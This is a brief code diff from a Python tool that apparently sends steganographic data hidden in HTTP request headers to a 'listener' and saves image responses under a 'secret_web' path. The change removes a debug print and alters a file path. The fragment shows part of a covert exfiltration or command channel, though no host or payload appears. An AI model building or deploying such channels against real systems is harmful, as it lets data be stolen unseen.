@@ -130,8 +130,6 @@ def send_stego_data_to_listener(data: str):
     """
     # Get the list of request header(s) to send
     requests_list = create_requests(data)
-    for request in requests_list:
-        print(request.headers)
     # Keep retrying connection to listener until successful (ensures functioning even if temporarily disconnected)
     while (True):  
         try:
@@ -151,7 +149,7 @@ def send_stego_data_to_listener(data: str):
 
 def get_command_line_input(response: Response):
     # TODO: request image from server
-    secret = "/secret_web/secret2.ico"
+    secret = "secret_web/client_secret.ico"
     #data = response.read()
     with open(secret, "wb") as f:
         f.write(response.content)
